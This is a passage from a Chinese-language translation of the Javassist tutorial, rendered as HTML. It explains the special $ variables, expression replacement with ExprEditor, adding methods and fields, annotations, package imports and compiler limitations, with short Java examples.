class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n * fact(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要使用<code>$cflow</code>，首先声明<code>$cflow</code>用于监控对方法fact()的调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CtMethod cm = ...;</span><br><span class="line">cm.useCflow(<span class="string">"fact"</span>);</span><br></pre></td></tr></table></figure><p>useCflow()的参数是声明的$cflow变量的标识符。任何有效的Java名称都可以作为标识符。由于标识符也可以包含<code>.</code>，例如，<code>my.Test.fact</code>就是一个有效的标识符。</p><p>那么，<code>$cflow(fact)</code>表示cm指定的方法的递归调用的深度。当方法第一次被调用时，$cflow(fact)的值是0，而当方法内部被递归调用时，它的值是1。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cm.insertBefore(<span class="string">"if ($cflow(fact) == 0)"</span></span><br><span class="line">              + <span class="string">"    System.out.println(\"fact \" + $1);"</span>);</span><br></pre></td></tr></table></figure><p>翻译方法fact()，以便它显示参数。因为检查了 $cflow(fact) 的值，所以如果在 fact() 中递归调用，则方法 fact() 不会显示参数。</p><p><code>$cflow</code>的值是当前线程当前最上面的栈帧下与指定方法cm相关联的栈帧数。在与指定方法cm不同的方法中也可以访问$cflow。</p><h4 id="r"><a href="#r" class="headerlink" title="$r"></a><code>$r</code></h4><p>$r 表示方法的结果类型（返回类型）。它用在 cast 表达式中作 cast 转换类型。 下面是一个典型的用法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object result = ... ;</span><br><span class="line">$_ = ($r)result;</span><br></pre></td></tr></table></figure><p>如果结果类型是一个基元类型，那么<code>($r)</code>遵循特殊的语义。首先，如果抛出表达式的操作数类型是基本类型，<code>($r)</code>就会作为一个普通的抛出操作数对结果类型进行操作。</p><p>另一方面，如果操作数类型是封装类型，<code>($r)</code>就会从封装类型转换到结果类型。例如，如果结果类型是int，那么<code>($r)</code>从java.lang.Integer转换为int。</p><p>如果结果类型是void，那么<code>($r)</code>不转换类型，它什么也不做。然而，如果操作数是对void方法的调用，那么($r)的结果是null。例如，如果结果类型是void，而foo()是一个void方法，则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_ = ($r)foo();</span><br></pre></td></tr></table></figure><h4 id="w"><a href="#w" class="headerlink" title="$w"></a><code>$w</code></h4><p><code>$w</code>代表一个封装类型。它必须在一个cast表达式中作为cast转换类型使用。($w)从一个基本类型转换到相应的封装类型。下面的代码是一个例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer i = ($w)<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>选择的封装类型取决于 ($w) 后面的表达式类型。如果表达式的类型是double，那么包装器类型就是java.lang.Double.。</p><p>如果<code>($w)</code>后面的表达式类型不是基本类型，那么($w)什么都不做。</p><h4 id="-1"><a href="#-1" class="headerlink" title="$_"></a><code>$_</code></h4><p>CtMethod和CtConstructor中的<code>insertAfter()</code>将编译后的代码插入到方法的最后。在给<code>insertAfter()</code>的语句中，不仅有上面所示的变量如<code>$0,$1</code>，还可以有<code>$_</code>。</p><p>变量<code>$_</code>表示方法的结果值。该变量的类型就是该方法的结果类型（返回类型）。如果结果类型是void，那么<code>$_</code>的类型是Object，<code>$_</code>的值是null。</p><p>虽然由insertAfter()插入的编译代码是在控件从方法中正常返回之前执行的，但它也可以在方法抛出异常时执行。<strong>为了在发生异常时执行它，<code>insertAfter()</code>的第二个参数asFinally必须为true。</strong></p><p>如果抛出异常，由<code>insertAfter()</code>插入的编译代码将作为最后子句执行。在编译后的代码中，<code>$_</code>的值为0或空。在编译代码执行终止后，原来抛出的异常会重新抛给调用者。注意，<code>$_</code>的值永远不会被抛给调用者，而是被丢弃。</p><h4 id="sig"><a href="#sig" class="headerlink" title="$sig"></a><code>$sig</code></h4><p>$sig的值是一个由java.lang.Class对象组成的数组，这些对象<strong>按照声明顺序表示形参类型</strong>。</p><h4 id="type"><a href="#type" class="headerlink" title="$type"></a><code>$type</code></h4><p>$type的值是一个java.lang.Class对象，代表结果值的类型。如果这是一个构造函数，那么这个变量是指Void.class。</p><h4 id="class"><a href="#class" class="headerlink" title="$class"></a><code>$class</code></h4><p><code>$class</code> 的值是一个 java.lang.Class 对象，代表声明编辑的方法所在的类。这代表了<code>$0</code>的类型。</p><h4 id="addCatch"><a href="#addCatch" class="headerlink" title="addCatch"></a><code>addCatch</code></h4><p><code>addCatch()</code>插入方法体抛出异常时执行的代码，控制权会返回给调用者。 在插入的源代码中，异常用 $e 表示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtMethod m = ...;</span><br><span class="line">CtClass etype = ClassPool.getDefault().get(<span class="string">"java.io.IOException"</span>);</span><br><span class="line">m.addCatch(<span class="string">"&#123; System.out.println($e); throw $e; &#125;"</span>, etype);</span><br></pre></td></tr></table></figure><p>转换成对应的 java 代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// the original method body</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">    System.out.println(e);</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，插入的代码片段必须以 throw 或 return 语句结束。</p><h3 id="修改方法体"><a href="#修改方法体" class="headerlink" title="修改方法体"></a>修改方法体</h3><p>CtMethod 和 CtConstructor 提供 setBody() 来替换整个方法体。<strong>它将新的源代码编译成 Java  字节码，并用它替换原方法体。</strong> 如果给定的源文本为 null，则替换后的方法体仅包含return语句，除非结果类型为 void，否则返回零或空值。</p><p>在传递给 setBody() 的源代码中，以 $ 开头的标识符具有特殊含义：</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code>, <code>$1</code>, <code>$2</code>, …</td><td><code>this</code> and 方法的参数</td></tr><tr><td><code>$args</code></td><td>方法参数数组.它的类型为 <code>Object[]</code></td></tr><tr><td><code>$$</code></td><td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>…<code>)</code></td></tr><tr><td><code>$cflow(</code>…<code>)</code></td><td><code>cflow</code> 变量</td></tr><tr><td><code>$r</code></td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td><code>$w</code></td><td>包装器类型，用于强制类型转换</td></tr><tr><td><code>$sig</code></td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td><code>$type</code></td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr></tbody></table><p><code>$_</code>不可用。</p><h3 id="替换表达式"><a href="#替换表达式" class="headerlink" title="替换表达式"></a>替换表达式</h3><p>Javassist 只允许修改方法体中包含的表达式。</p><p>javassist.expr.ExprEditor 是一个用于替换方法体中的表达式的类。用户可以定义 ExprEditor 的子类来指定修改表达式的方式。</p><p>要运行 ExprEditor 对象，用户必须在 CtMethod 或 CtClass 中调用 instrument()。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CtMethod cm = ... ;</span><br><span class="line">cm.instrument(</span><br><span class="line">    <span class="keyword">new</span> ExprEditor() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">edit</span><span class="params">(MethodCall m)</span> <span class="keyword">throws</span> CannotCompileException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (m.getClassName().equals(<span class="string">"Point"</span>)</span><br><span class="line">                          &amp;&amp; m.getMethodName().equals(<span class="string">"move"</span>))</span><br><span class="line">                m.replace(<span class="string">"&#123; $1 = 0; $_ = $proceed($$); &#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>上述代码，搜索由 cm 表示的方法体，并用使用下面的代码替换 Point 中的 move()调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; $<span class="number">1</span> = <span class="number">0</span>; $_ = $proceed($$); &#125;</span><br></pre></td></tr></table></figure><p>因此 move() 的第一个参数总是0。注意，替换的代码不是一个表达式，而是一个语句或块。 它不能是或包含 try-catch 语句。</p><p><strong>方法 instrument()搜索一个方法体。</strong>如果它找到了一个表达式，如方法调用、字段访问和对象创建，那么它就在<strong>给定的ExprEditor对象上调用edit()</strong>。<strong>edit()的参数是一个代表找到的表达式的对象</strong>。edit()方法可以通过该对象检查和替换该表达式。</p><p><strong>在edit()的参数上调用replace()，可以将给定的语句或块替换为表达式</strong>。如果给定的块是空块，也就是说，<strong>如果执行了replace(“{}”)，那么表达式就会从方法体中删除</strong>。如果你想在表达式之前/之后插入一条语句（或一个代码块），应该向 replace()传递一个类似下面的代码块，无论表达式是方法调用、字段访问、对象创建，还是其他：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; *before-statements;*  </span><br><span class="line">$_ = $proceed($$);  </span><br><span class="line">*after-statements;* &#125;</span><br></pre></td></tr></table></figure><p>当是write access写访问：</p><p><code>$_ = $proceed();</code></p><p>当是read access读访问：</p><p><code>$proceed($$);</code></p><h4 id="javassist-expr-MethodCall"><a href="#javassist-expr-MethodCall" class="headerlink" title="javassist.expr.MethodCall"></a>javassist.expr.MethodCall</h4><p>一个MethodCall对象代表一个方法调用。MethodCall中的方法replace()为方法调用替换了一条语句或一个代码块。它接收代表被替换的语句或代码块的源文本，其中以$开头的标识符具有特殊意义，就像传递给insertBefore()的源文本一样。</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code></td><td>方法调用的目标对象。它不等于 this，它代表了调用者。 如果方法是静态的，则 $0 为 null</td></tr><tr><td><code>$1</code>, <code>$2</code> ..</td><td>方法的参数</td></tr><tr><td><code>$_</code></td><td>方法调用的结果</td></tr><tr><td><code>$r</code></td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr><tr><td><code>$sig</code></td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td><code>$type</code></td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr><tr><td><code>$proceed</code></td><td>调用表达式中方法的名称</td></tr></tbody></table><p>这里的方法调用意味着由 MethodCall 对象表示的方法。</p><p>其他标识符如 <code>$w</code>，<code>$args</code> 和 <code>$$</code> 也可用。</p><p>除非方法调用的返回类型为 void，否则返回值必须在源代码中赋给 <code>$_</code> ，<code>$_</code>的类型是表达式的结果类型。如果结果类型为 void，那么 <code>$_</code> 的值将被忽略。</p><p>$proceed 不是字符串值，而是特殊的语法。 它后面必须跟一个由括号括起来的参数列表。</p><h4 id="javassist-expr-ConstructorCall"><a href="#javassist-expr-ConstructorCall" class="headerlink" title="javassist.expr.ConstructorCall"></a>javassist.expr.ConstructorCall</h4><p>ConstructorCall 表示构造函数调用，例如包含在构造函数中的 this() 和 super()。<strong>ConstructorCall 中的方法 replace() 可以使用语句或代码块来代替构造函数。</strong>它接收表示替换语句或块的源代码。和 insertBefore() 方法一样，<strong>传递给 replace 的源代码中，</strong>以 $ 开头的标识符具有特殊的含义。</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code></td><td>构造调用的目标对象。它等于 this</td></tr><tr><td><code>$1</code>, <code>$2</code>, …</td><td>构造函数的参数</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr><tr><td><code>$sig</code></td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td><code>$proceed</code></td><td>调用表达式中构造函数的名称</td></tr></tbody></table><p>其他标识符如 <code>$w</code>，<code>$args</code> 和 <code>$$</code> 也可用。</p><p>由于任何构造函数必须调用超类的构造函数或同一类的另一个构造函数，所以替换语句必须包含构造函数调用，通常是对 $proceed() 的调用。</p><p>$proceed 不是字符串值，而是特殊的语法。 它后面必须跟一个由括号括起来的参数列表。</p><h4 id="javassist-expr-FieldAccess"><a href="#javassist-expr-FieldAccess" class="headerlink" title="javassist.expr.FieldAccess"></a>javassist.expr.FieldAccess</h4><p>FieldAccess 对象表示字段访问。 如果找到对应的字段访问操作，ExprEditor 中的 edit() 方法将接收到一个 FieldAccess 对象。FieldAccess 中的 replace() 方法接收替源代码来替换字段访问。</p><h4 id="javassist-expr-NewExpr"><a href="#javassist-expr-NewExpr" class="headerlink" title="javassist.expr.NewExpr"></a>javassist.expr.NewExpr</h4><p>NewExpr 表示使用 new 运算符（不包括数组创建）创建对象的表达式。 如果发现创建对象的操作，NewEditor 中的 edit() 方法将接收到一个 NewExpr 对象。NewExpr 中的 replace() 方法接收替源代码来替换字段访问。</p><h4 id="javassist-expr-NewArray"><a href="#javassist-expr-NewArray" class="headerlink" title="javassist.expr.NewArray"></a>javassist.expr.NewArray</h4><p>NewArray 表示使用 new 运算符创建数组。如果发现数组创建的操作，ExprEditor 中的 edit() 方法一个 NewArray 对象。NewArray 中的 replace() 方法可以使用源代码来替换数组创建操作。</p><h4 id="javassist-expr-Instanceof"><a href="#javassist-expr-Instanceof" class="headerlink" title="javassist.expr.Instanceof"></a>javassist.expr.Instanceof</h4><p>一个 InstanceOf 对象表示一个 instanceof 表达式。 如果找到 instanceof 表达式，则ExprEditor 中的 edit() 方法接收此对象。Instanceof 中的 replace() 方法可以使用源代码来替换 instanceof 表达式。</p><h4 id="javassist-expr-Cast"><a href="#javassist-expr-Cast" class="headerlink" title="javassist.expr.Cast"></a>javassist.expr.Cast</h4><p>Cast 表示 cast 表达式。如果找到 cast 表达式，ExprEditor 中的 edit() 方法会接收到一个 Cast 对象。 Cast 的 replace() 方法可以接收源代码来替换替换 cast 表达式。</p><h4 id="javassist-expr-Handler"><a href="#javassist-expr-Handler" class="headerlink" title="javassist.expr.Handler"></a>javassist.expr.Handler</h4><p>Handler 对象表示 try-catch 语句的 catch 子句。 如果找到 catch，ExprEditor 中的 edit() 方法会接收此对象。 Handler 中的 insertBefore() 方法会将收到的源代码插入到 catch 子句的开头。</p><h3 id="添加新方法和字段"><a href="#添加新方法和字段" class="headerlink" title="添加新方法和字段"></a>添加新方法和字段</h3><h4 id="添加新方法"><a href="#添加新方法" class="headerlink" title="添加新方法"></a>添加新方法</h4><p>Javassist 可以创建新的方法和构造函数。CtNewMethod 和 CtNewConstructor 提供了几个工厂方法来创建 CtMethod 或 CtConstructor 对象。make() 方法可以通过源代码来CtMethod 或 CtConstructor 对象。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public int xmove(int dx) &#123; x += dx; &#125;"</span>,point);</span><br><span class="line">point.addMethod(m);</span><br></pre></td></tr></table></figure><p>上面的代码向类 Point 添加了一个公共方法 xmove()。在这个例子中，x 是类 Point 的一个int 字段。</p><p>传递给 make() 和 setBody() 的源文本可以包括以<code>$</code>开头的标识符（除了<code>$_</code>）。 如果目标对象和目标方法名也被传递给 make() 方法，源文本中也可以包括 <code>$proceed</code>。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public int ymove(int dy) &#123; $proceed(0, dy); &#125;"</span>,</span><br><span class="line">                 point, <span class="string">"this"</span>, <span class="string">"move"</span>);</span><br><span class="line">point.addMethod(m);</span><br></pre></td></tr></table></figure><p>这个程序创建一个 ymove() 方法，定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ymove</span><span class="params">(<span class="keyword">int</span> dy)</span> </span>&#123; <span class="keyword">this</span>.move(<span class="number">0</span>, dy); &#125;</span><br></pre></td></tr></table></figure><p>注意，$proceed 已经被替换为 this.move。</p><p>Javassist 还提供了另一种添加新方法的方式。 你可以先创建一个抽象方法，然后给它一个方法体：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = ... ;</span><br><span class="line">CtMethod m = <span class="keyword">new</span> CtMethod(CtClass.intType, <span class="string">"move"</span>,<span class="keyword">new</span> CtClass[] &#123; CtClass.intType &#125;, cc);</span><br><span class="line">cc.addMethod(m);</span><br><span class="line">m.setBody(<span class="string">"&#123; x += $1; &#125;"</span>);</span><br><span class="line">cc.setModifiers(cc.getModifiers() &amp; ~Modifier.ABSTRACT);</span><br></pre></td></tr></table></figure><p>因为 Javassist 在类中添加了的方法是抽象的，所以在调用 setBody() 之后，必须将类显式地改回非抽象类（拥有方法体）。</p><h4 id="相互递归的方法"><a href="#相互递归的方法" class="headerlink" title="相互递归的方法"></a>相互递归的方法</h4><p>如果一个方法调用了另一个没有被添加到类中的方法，Javassist就不能编译该方法。</p><p>(<strong>但是Javassist 可以编译一个以递归方式调用自己的方法。</strong>)</p><p>要将相互递归的方法添加到一个类中，你需要一个如下所示的技巧。假设你想把方法m()和n()添加到一个由cc表示的类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = ... ;</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public abstract int m(int i);"</span>, cc);</span><br><span class="line">CtMethod n = CtNewMethod.make(<span class="string">"public abstract int n(int i);"</span>, cc);</span><br><span class="line">cc.addMethod(m);</span><br><span class="line">cc.addMethod(n);</span><br><span class="line">m.setBody(<span class="string">"&#123; return ($1 &lt;= 0) ? 1 : (n($1 - 1) * $1); &#125;"</span>);</span><br><span class="line">n.setBody(<span class="string">"&#123; return m($1); &#125;"</span>);</span><br><span class="line">cc.setModifiers(cc.getModifiers() &amp; ~Modifier.ABSTRACT);</span><br></pre></td></tr></table></figure><p>你必须先创建两个抽象方法，并将它们添加到类中。然后设置它们的方法体，即使方法体包括互相递归的调用。 最后，必须将类更改为非抽象类。</p><h4 id="添加一个字段"><a href="#添加一个字段" class="headerlink" title="添加一个字段"></a>添加一个字段</h4><p>Javassist 还允许用户创建一个新字段。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"z"</span>, point);<span class="comment">//int z;</span></span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure><p>该程序向类 Point 添加一个名为 z 的字段。 <code>int z;</code><br>如果必须指定添加字段的初始值，那么上面的程序必须修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"z"</span>, point);</span><br><span class="line">point.addField(f, <span class="string">"0"</span>);  <span class="comment">// initial value is 0</span></span><br></pre></td></tr></table></figure><p><strong>总结：先声明再初始化。</strong></p><p>现在，方法 addField() 接收两个参数，第二个参数表示计算初始值的表达式。<strong>这个表达式可以是任意 Java 表达式，只要其结果与字段的类型匹配。 请注意，表达式不以分号结尾。</strong></p><p>此外，上述代码可以重写为更简单代码：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().<span class="keyword">get</span>(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = CtField.make(<span class="string">"public int z = 0;"</span>, point);</span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure><h4 id="删除成员"><a href="#删除成员" class="headerlink" title="删除成员"></a>删除成员</h4><p>要删除字段或方法，请在 CtClass 的 removeField() 或 removeMethod() 方法。 一个CtConstructor 可以通过 CtClass 的 removeConstructor() 删除。</p><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>CtClass，CtMethod，CtField 和 CtConstructor 提供 getAnnotations() 方法，用于读取注解。 它返回一个注解类型的对象。</p><p>例如，假设有以下注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Author &#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">year</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是使用注解的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Author</span>(name=<span class="string">"Chiba"</span>, year=<span class="number">2005</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，可以使用 getAnnotations() 获取注解的值。 它返回一个包含注解类型对象的数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">Object[] all = cc.getAnnotations();</span><br><span class="line">Author a = (Author)all[<span class="number">0</span>];</span><br><span class="line">String name = a.name();</span><br><span class="line"><span class="keyword">int</span> year = a.year();</span><br><span class="line">System.out.println(<span class="string">"name: "</span> + name + <span class="string">", year: "</span> + year);</span><br></pre></td></tr></table></figure><p>这段代码输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name: Chiba, year: <span class="number">2005</span></span><br></pre></td></tr></table></figure><p>由于 Point 的注解只有 @Author，所以数组的长度是 1，all[0] 是一个 Author 对象。 注解成员值可以通过调用Author对象的 name() 和 year() 来获取。</p><p>要使用 getAnnotations()，注释类型（如 Author）必须包含在当前类路径中。它们也必须也可以从 ClassPool 对象访问。如果未找到注释类型的类文件，Javassist 将无法获取该注释类型的成员的默认值。</p><h3 id="运行时支持类"><a href="#运行时支持类" class="headerlink" title="运行时支持类"></a>运行时支持类</h3><p>在大多数情况下，使用 Javassist 修改类不需要运行 Javassist。 但是，Javassist 编译器生成的某些字节码需要运行时支持类，这些类位于 javassist.runtime 包中（有关详细信息，请阅读该包的API文档）。请注意，<strong>javassist.runtime 是修改的类时唯一可能需要使用的包</strong>。 修改类的运行时不会再使用其他的 Javassist 类。</p><h3 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h3><p>源代码中的所有类名都必须是完整的（必须包含包名，java.lang 除外）。例如，Javassist 编译器可以解析 Object 以及 java.lang.Object。</p><p><strong>要告诉编译器在解析类名时搜索其他包，请在 ClassPool中 调用 importPackage()</strong>。 例如，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.importPackage(<span class="string">"java.awt"</span>);</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"Test"</span>);</span><br><span class="line">CtField f = CtField.make(<span class="string">"public Point p;"</span>, cc);<span class="comment">//识别为java.awt.Point</span></span><br><span class="line">cc.addField(f);</span><br></pre></td></tr></table></figure><p>第二行导入了 java.awt 包。 因此，第三行不会抛出异常。 <strong>编译器可以将 Point 识别为java.awt.Point</strong>。</p><p> <strong>importPackage() 不会影响 ClassPool 中的 get() 方法</strong>。只有编译器才考虑导入包。 get() 的参数必须是完整类名。</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>在目前实现中，Javassist 中包含的 Java 编译器有一些限制：</p><ul><li><p>J2SE 5.0 引入的新语法（包括枚举和泛型）不受支持。注释由 Javassist 的低级 API 支持。 参见 javassist.bytecode.annotation 包（以及 CtClass 和 CtBehavior 中的 getAnnotations()）。对泛型只提供部分支持。更多信息，请参阅<a href="http://www.javassist.org/tutorial/tutorial3.html#generics" target="_blank" rel="noopener">后面</a>的部分；</p></li><li><p>初始化数组时，只有一维数组可以用大括号加逗号分隔元素的形式初始化，多维数组还不支持；</p></li><li><p>编译器不能编译包含内部类和匿名类的源代码。 但是，Javassist 可以读取和修改内部/匿名类的类文件；</p></li><li><p>不支持带标记的 continue 和 break 语句；</p></li><li><p>编译器没有正确实现 Java 方法调度算法。编译器可能会混淆在类中定义的重载方法（方法名称相同，查参数列表不同）。例如：</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(A a)</span> </span>&#123; .. &#125; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(B b)</span> </span>&#123; .. &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果编译的表达式是 <code>x.foo(new C())</code>，其中 <code>x</code> 是 <code>X</code> 的实例，编译器将产生对 <code>foo(A)</code> 的调用，尽管编译器可以正确地编译 <code>foo((B) new C())</code> 。</p><p><strong>建议使用 # 作为类名和静态方法或字段名之间的分隔符</strong>。 例如，在常规 Java 中：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javassist</span><span class="selector-class">.CtClass</span><span class="selector-class">.intType</span><span class="selector-class">.getName</span>()</span><br></pre></td></tr></table></figure><p>在 javassist.CtClass 中的静态字段 intType 指示的对象上调用一个方法 getName()。 在Javassist 中，用户也可以写上面的表达式，但是建议写成这样：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javassist.CtClass#intType.getName()</span><br></pre></td></tr></table></figure><p>可以使编译器可以快速解析表达式。</p><h2 id="字节码级API"><a href="#字节码级API" class="headerlink" title="字节码级API"></a>字节码级API</h2><p>Javassist 还提供了用于直接编辑类文件的低级级 API。 使用此 API之前，你需要详细了解Java 字节码和类文件格式，因为它允许你对类文件进行任意修改。</p><p>如果你只想生成一个简单的类文件，使用<code>javassist.bytecode.ClassFileWriter</code>就足够了。 它比<code>javassist.bytecode.ClassFile</code>更快而且更小。</p><h3 id="获取ClassFile对象"><a href="#获取ClassFile对象" class="headerlink" 